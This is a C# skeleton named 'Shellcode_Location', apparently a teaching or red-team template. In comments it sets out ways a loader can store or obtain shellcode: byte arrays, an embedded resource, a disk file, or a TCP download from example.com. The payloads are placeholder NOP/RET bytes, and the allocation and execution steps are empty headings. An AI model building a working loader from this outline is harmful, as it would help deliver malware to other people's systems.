using System;
using System.Collections.Generic;
using System.Linq;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.IO;
using System.Diagnostics;
using System.Net.Sockets;

namespace Shellcode_Location
{
    internal class Program
    {
        //[01]
        //Global Variable
        /*
        static byte[] buf = {0x90, 0xC3};
        */

        static void Main(string[] args)
        {
            //[00]
            //Local Variable
            /*
            byte[] buf;
            if (IntPtr.Size == 4)
                buf = new byte[] {0x90, 0xC3};
            else
                buf = new byte[] {0x90, 0xC3};
            */

            //[02]
            //Resource File
            /*
            Assembly assembly = Assembly.GetExecutingAssembly();
            
            Stream stream = assembly.GetManifestResourceStream(nameof(Shellcode_Location) + ".payload.bin");

            BinaryReader br = new BinaryReader(stream);
            
            //OR

            StreamReader reader = new StreamReader(stream);

            byte[] buf = new byte[stream.Length];
            br.Read(buf, 0, buf.Length);

            //OR

            string Noise = reader.ReadToEnd();
            */

            //[03]
            //NOT LOTD
            //File From Disk
            /*
            byte[] fileBytes = File.ReadAllBytes("payload.bin");
            */

            //[04]
            //Network
            /*
            TcpClient tcpClient = new TcpClient("example.com", 1234);
            using (NetworkStream ns = tcpClient.GetStream())
            {
                byte[] chunks = new byte[1024];
                ns.Read(chunks, 0, chunks.Length);
            }
            */

            //ALLOCATION MEMORY

            //WRITE MEMORY

            //EXECUTION FUNCTION

            //FREE MEMORY
        }
    }
}
